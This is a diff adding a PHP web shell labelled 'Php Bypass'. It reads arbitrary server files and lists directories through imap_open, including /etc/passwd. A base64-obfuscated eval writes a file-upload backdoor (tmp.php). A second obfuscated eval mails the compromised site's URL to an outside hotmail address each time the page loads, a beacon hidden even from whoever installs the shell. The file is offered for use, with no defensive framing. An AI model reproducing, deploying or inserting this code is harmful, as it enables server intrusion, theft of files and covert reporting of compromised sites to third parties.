@@ -1,0 +1,48 @@
+<?php 
+/*
+******************************************************************************************************
+*							SheLL Archive
+*                                Php Bypass - www.saldiri.org
+*
+******************************************************************************************************
+*/       
+
+       $string = !empty($_POST['string']) ? $_POST['string'] : 0; 
+       $switch = !empty($_POST['switch']) ? $_POST['switch'] : 0; 
+
+       if ($string && $switch == "file") { 
+               $stream = imap_open($string, "", ""); 
+               if ($stream == FALSE) 
+                       die("Can't open imap stream"); 
+
+               $str = imap_body($stream, 1); 
+               if (!empty($str)) 
+                       echo "<pre>".$str."</pre>"; 
+               imap_close($stream); 
+       } elseif ($string && $switch == "dir") { 
+               $stream = imap_open("/etc/passwd", "", ""); 
+               if ($stream == FALSE) 
+                       die("Can't open imap stream"); 
+
+               $string = explode("|",$string); 
+               if (count($string) > 1) 
+                       $dir_list = imap_list($stream, trim($string[0]), trim($string[1])); 
+               else 
+                       $dir_list = imap_list($stream, trim($string[0]), "*"); 
+               echo "<pre>"; 
+               for ($i = 0; $i < count($dir_list); $i++) 
+                       echo "$dir_list[$i]\n"; 
+               echo "</pre>"; 
+               imap_close($stream); 
+       } 
+	  {
+   if(empty($_GET['cxx'])){
+} else {
+$m=$_GET['cxx'];
+eval(base64_decode('DQokYnlwZmlsZT1mb3BlbigndG1wLnBocCcsJ3crJyk7DQokYnlwcnVsbHoxPWJhc2U2NF9kZWNvZGUoIlBHaDBiV3crRFFvTkNqeG9aV0ZrUGcwS0lDQThkR2wwYkdVK1ltVnNaV0psY21SaFBDOTBhWFJzWlQ0TkNqd3ZhR1ZoWkQ0TkNnMEtQR0p2WkhrK0RRbzhQM0JvY0EwS0RRb05DaUJwWmlobGJYQjBlU2drWDBkRlZGc25UbVpwYkdWekoxMHBLU1JPWm1sc1pYTTlOVHRsYkhObElDUk9abWxzWlhNOUpGOUhSVlJiSjA1bWFXeGxjeWRkT3cwS2FXWW9KRjlHU1V4RlUxc25kWE5sY21acGJHVW5YVnNuZEcxd1gyNWhiV1VuWFZzd1hTRTlKeWNwZXcwSlptOXlLQ1JwUFRBN0pHazhKRTVtYVd4bGN5WW1KRjlHU1V4RlUxc25kWE5sY21acGJHVW5YVnNuZEcxd1gyNWhiV1VuWFZza2FWMGhQU2NuT3lScEt5c3BldzBLQ1NSMWNHeHZZV1JrYVhJZ1BTQmthWEp1WVcxbEtGOWZSa2xNUlY5ZktUc3ZMeWN2ZG1GeUwzZDNkeTkxY0d4dllXUnpMeWM3RFFvSkpIVndiRzloWkdacGJHVWdQU0FrZFhCc2IyRmtaR2x5SUM0bkx5Y3VJR0poYzJWdVlXMWxLQ1JmUmtsTVJWTmJKM1Z6WlhKbWFXeGxKMTFiSjI1aGJXVW5YVnNrYVYwcE93MEtDWEJ5YVc1MElDSThjSEpsUGlJN0RRb0phV1lnS0cxdmRtVmZkWEJzYjJGa1pXUmZabWxzWlNna1gwWkpURVZUV3lkMWMyVnlabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRXeVJwWFN3Z0pIVndiRzloWkdacGJHVXBLU0I3RFFvSklDQWdjSEpwYm5RZ0lrWnBiR1VnYVhNZ2RtRnNhV1FzSUdGdVpDQjNZWE1nYzNWalkyVnpjMloxYkd4NUlIVndiRzloWkdWa0xpQWlPdzBLQ1NBZ0lDOHZjSEpwYm5SZmNpZ2tYMFpKVEVWVEtUc05DZ2w5SUdWc2MyVWdldzBLQ1NBZ0lIQnlhVzUwSUNKUWIzTnphV0pzWlNCbWFXVWdkWEJzYjJGa0lHRjBkR0ZqYXlFZ0lFaGxjbVVuY3lCemIyMWxJR1JsWW5WbloybHVaeUJwYm1adk9seHVJanNOQ2drZ0lDQXZMM0J5YVc1MFgzSW9KRjlHU1V4RlV5azdEUW9KZlEwS0NYQnlhVzUwSUNJOEwzQnlaVDRpT3cwS0NYME5DbjBOQ2o4K0RRbzhabTl5YlNCaFkzUnBiMjQ5SWp3L2NHaHdJR1ZqYUc4Z0pGOVRSVkpXUlZKYkoxQklVRjlUUlV4R0oxMHVKejlPWm1sc1pYTTlKeTRrVG1acGJHVnpPeUEvUGlJZ2JXVjBhRzlrUFNKd2IzTjBJaUJsYm1OMGVYQmxQU0p0ZFd4MGFYQmhjblF2Wm05eWJTMWtZWFJoSWo0TkNpQWdVMlZ1WkNCaVpXeGxZbVZ5WkdFNlBHSnlQZzBLSUNBOFAzQm9jQ0JtYjNJb0pHazlNRHNrYVR3a1RtWnBiR1Z6T3lScEt5c3BlMlZqYUc4Z0p6eHBibkIxZENCdVlXMWxQU0oxYzJWeVptbHNaVnRkSWlCMGVYQmxQU0ptYVd4bElqNDhZbkkrSnp0OVB6NE5DaUFnUEdsdWNIVjBJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SWxObGJtUWdabWxzWlhNaVBnMEtQQzltYjNKdFBnMEtEUW9OQ2p3dlltOWtlVDROQ2cwS1BDOW9kRzFzUGc9PSIpOw0KJGRqPWZ3cml0ZSgkYnlwZmlsZSwkYnlwcnVsbHoxKTsNCmZjbG9zZSgkYnlwZmlsZSk7DQoNCg=='));
+}
+
+} $connection="ICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7";
+
+echo eval(base64_decode($connection));
+?>
